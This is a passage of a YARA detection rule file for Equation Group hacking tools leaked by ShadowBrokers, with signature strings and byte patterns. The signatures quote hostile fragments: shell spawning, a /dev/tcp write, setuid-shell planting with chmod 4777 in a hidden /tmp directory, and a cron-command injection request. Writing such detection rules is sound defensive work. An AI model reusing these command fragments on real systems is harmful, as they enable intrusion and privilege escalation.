elatedmonkey.1.0.1.1.sh)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_elatedmonkey_1_0_1_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x3 = \"Usage: $0 ( -s IP PORT | CMD )\" fullword ascii\n        $s5 = \"os.execl(\\\"/bin/sh\\\", \\\"/bin/sh\\\", \\\"-c\\\", \\\"$CMD\\\")\" fullword ascii\n        $s13 = \"PHP_SCRIPT=\\\"$HOME/public_html/info$X.php\\\"\" fullword ascii\n        $s15 = \"cat > /dev/tcp/127.0.0.1/80 <<END\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 5KB and (1 of ($x*) and 5 of ($s*))) or (all of them)\n}\n\nrule EquationGroup_scanner\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: scanner)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_scanner\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"program version netid     address             service         owner\" fullword ascii\n        $x4 = \"*** Sorry about the raw output, I'll leave it for now\" fullword ascii\n        $x5 = \"-scan winn %s one\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup__ftshell_ftshell_v3_10_3_0\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: ftshell, ftshell.v3.10.3.7)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__ftshell_ftshell_v3_10_3_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"set uRemoteUploadCommand \\\"[exec cat /current/.ourtn-ftshell-upcommand]\\\"\" fullword ascii\n        $s2 = \"send \\\"\\\\[ \\\\\\\"\\\\$BASH\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" -o \\\\\\\"\\\\$SHELL\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" \\\\] &&\" ascii\n        $s3 = \"system rm -f /current/tmp/ftshell.latest\" fullword ascii\n        $s4 = \"# ftshell - (file: Transfer Shell)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 100KB and 1 of them) or (2 of them)\n}\n\nrule EquationGroup__scanner_scanner_v2_1_2\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: scanner, scanner.v2.1.2)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__scanner_scanner_v2_1_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Welcome to the network scanning tool\" fullword ascii\n        $s2 = \"Scanning port %d\" fullword ascii\n        $s3 = \"/current/down/cmdout/scans\" fullword ascii\n        $s4 = \"Scan for SSH version\" fullword ascii\n        $s5 = \"program vers proto   port  service\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 100KB and 2 of them) or (all of them)\n}\n\nrule EquationGroup__ghost_sparc_ghost_x86_3\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: ghost_sparc, ghost_x86)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__ghost_sparc_ghost_x86_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target\" fullword ascii\n        $x2 = \"Sending shellcode as part of an open command...\" fullword ascii\n        $x3 = \"cmdshellcode\" fullword ascii\n        $x4 = \"You will not be able to run the shellcode. Exiting...\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 70KB and 1 of them) or (2 of them)\n}\n\nrule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n        $s2 = \"e.g.: -n 1-1024,1080,6666,31337 \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 50KB and all of them)\n}\n\nrule EquationGroup__jparsescan_parsescan_5\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: jparsescan, parsescan)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__jparsescan_parsescan_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"# default is to dump out all scanned hosts found\" fullword ascii\n        $s2 = \"$bool .= \\\" -r \\\" if (/mibiisa.* -r/);\" fullword ascii\n        $s3 = \"sadmind is available on two ports, this also works)\" fullword ascii\n        $s4 = \"-x IP      gives \\\\\\\"hostname:# users:load ...\\\\\\\" if positive xwin scan\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 40KB and 1 of them) or (2 of them)\n}\n\nrule EquationGroup__funnelout_v4_1_0_1\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: funnelout.v4.1.0.1.pl)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__funnelout_v4_1_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"header(\\\"Set-Cookie: bbsessionhash=\\\" . \\\\$hash . \\\"; path=/; HttpOnly\\\");\" fullword ascii\n        $s2 = \"if ($code =~ /proxyhost/) {\" fullword ascii\n        $s3 = \"\\\\$rk[1] = \\\\$rk[1] - 1;\" fullword ascii\n        $s4 = \"#existsUser($u) or die \\\"User '$u' does not exist in database.\\\\n\\\";\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 100KB and 2 of them) or (all of them)\n}\n\nrule EquationGroup__magicjack_v1_1_0_0_client\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: magicjack_v1.1.0.0_client-1.1.0.0.py)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__magicjack_v1_1_0_0_client\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"temp = ((left >> 1) ^ right) & 0x55555555\" fullword ascii\n        $s2 = \"right ^= (temp <<  16) & 0xffffffff\" fullword ascii\n        $s3 = \"tempresult = \\\"\\\"\" fullword ascii\n        $s4 = \"num = self.bytes2long(data)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 80KB and 3 of them) or (all of them)\n}\n\nrule EquationGroup__ftshell\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (files: ftshell, ftshell.v3.10.3.7)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup__ftshell\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"if { [string length $uRemoteUploadCommand]\" fullword ascii\n        $s2 = \"processUpload\" fullword ascii\n        $s3 = \"global dothisreallyquiet\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 100KB and 2 of them) or (all of them)\n}\n\nrule EquationGroup_store_linux_i386_v_3_3_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_store_linux_i386_v_3_3_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[-] Failed to map file: %s\" fullword ascii\n        $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n        $s3 = \"[!] Name has size of 0!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 60KB and all of them)\n}\n\nrule EquationGroup_morerats_client_genkey\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_morerats_client_genkey\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')\" fullword ascii\n        $x2 = \"client_auth = binascii.hexlify(lo_execute('openssl rand 16'))\" fullword ascii\n\n    condition:\n        (filesize < 3KB and all of them)\n}\n\nrule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n        $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_cursesleepy_mswin32_v_1_0_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cursesleepy_mswin32_v_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"A}%j,R\" fullword ascii\n        $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 }\n        $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule EquationGroup_porkserver_v3_0_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_porkserver_v3_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%s: %s rpcprog=%d, rpcvers = %d/%d, proto=%s, wait.max=%d.%d, user.group=%s.%s builtin=%lx server=%s\" fullword ascii\n        $s2 = \"%s/%s server failing (looping), service terminated\" fullword ascii\n        $s3 = \"getpwnam: %s: No such user\" fullword ascii\n        $s4 = \"execv %s: %m\" fullword ascii\n        $s5 = \"%s/%s: getsockname: %m\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 70KB and 4 of them)\n}\n\nrule EquationGroup_cursehelper_win2k_i686_v_2_2_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cursehelper_win2k_i686_v_2_2_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}\" fullword ascii\n        $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 }\n        $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and all of them)\n}\n\nrule EquationGroup_morerats_client_addkey\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_morerats_client_addkey\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"print '  -s storebin  use storebin as the Store executable\\\\n'\" fullword ascii\n        $x2 = \"os.system('%s --file=\\\"%s\\\" --wipe > /dev/null' % (storebin, b))\" fullword ascii\n        $x3 = \"print '  -k keyfile   the key text file to inject'\" fullword ascii\n\n    condition:\n        (filesize < 20KB and 1 of them)\n}\n\nrule EquationGroup_noclient_3_3_2\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_noclient_3_3_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning\" fullword ascii\n        $x2 = \"iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;\" fullword ascii\n        $x3 = \"noclient: failed to execute %s: %s\" fullword ascii\n        $x4 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n        $s5 = \"Attempting connection from 0.0.0.0:\" ascii\n\n    condition:\n        (filesize < 1000KB and 1 of them)\n}\n\nrule EquationGroup_curseflower_mswin32_v_1_0_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_curseflower_mswin32_v_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"<pVt,<et(<st$<ct$<nt\" fullword ascii\n        $op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_tmpwatch\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_tmpwatch\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"chown root:root /tmp/.scsi/dev/bin/gsh\" fullword ascii\n        $s2 = \"chmod 4777 /tmp/.scsi/dev/bin/gsh\" fullword ascii\n\n    condition:\n        (filesize < 1KB and 1 of them)\n}\n\nrule EquationGroup_orleans_stride_sunos5_9_v_2_4_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_orleans_stride_sunos5_9_v_2_4_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"_lib_version\" fullword ascii\n        $s2 = \",%02d%03d\" fullword ascii\n        $s3 = \"TRANSIT\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_morerats_client_noprep\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_morerats_client_noprep\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"storestr = 'echo -n \\\"%s\\\" | Store --nullterminate --file=\\\"%s\\\" --set=\\\"%s\\\"' % (nopenargs, outfile, VAR_NAME)\" fullword ascii\n        $x2 = \"The NOPEN-args provided are injected into infile if it is a valid\" fullword ascii\n        $x3 = \" -i                do not autokill after 5 hours\" fullword ascii\n\n    condition:\n        (filesize < 9KB and 1 of them)\n}\n\nrule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cursezinger_linuxrh7_3_v_2_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \",%02d%03d\" fullword ascii\n        $s2 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n        $s3 = \"__strtoll_internal\" fullword ascii\n        $s4 = \"__strtoul_internal\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 400KB and all of them)\n}\n\nrule EquationGroup_seconddate_ImplantStandalone_3_0_3\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_seconddate_ImplantStandalone_3_0_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"EFDGHIJKLMNOPQRSUT\" fullword ascii\n        $s2 = \"G8HcJ HcF LcF0LcN\" fullword ascii\n        $s3 = \"GhHcJ0HcF@LcF0LcN8H\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 1000KB and all of them)\n}\n\nrule EquationGroup_watcher_solaris_i386_v_3_3_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_watcher_solaris_i386_v_3_3_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"getexecname\" fullword ascii\n        $s2 = \"invalid option `\" fullword ascii\n        $s6 = \"__fpstart\" fullword ascii\n        $s12 = \"GHFIJKLMNOPQRSTUVXW\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 700KB and all of them)\n}\n\nrule EquationGroup_gr_dev_bin_now\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_gr_dev_bin_now\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"HTTP_REFERER=\\\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\\\"\" fullword ascii\n        $x2 = \"exec /usr/share/redmin/cgi/redmin\" fullword ascii\n\n    condition:\n        (filesize < 1KB and 1 of them)\n}\n\nrule EquationGroup_gr_dev_bin_post\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_gr_dev_bin_post\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005\" ascii\n\n    condition:\n        (filesize < 1KB and all of them)\n}\n\nrule EquationGroup_curseyo_win2k_v_1_0_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_curseyo_win2k_v_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"0123456789abcdefABCEDF:\" fullword ascii\n        $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f }\n        $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d }\n        $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_gr\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_gr\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"if [ -f /tmp/tmpwatch ] ; then\" fullword ascii\n        $s2 = \"echo \\\"bailing. try a different name\\\"\" fullword ascii\n\n    condition:\n        (filesize < 1KB and all of them)\n}\n\nrule EquationGroup_curseroot_win2k_v_2_1_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_curseroot_win2k_v_2_1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n        $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 }\n        $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff }\n        $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and $s1 and 2 of ($op*))\n}\n\nrule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        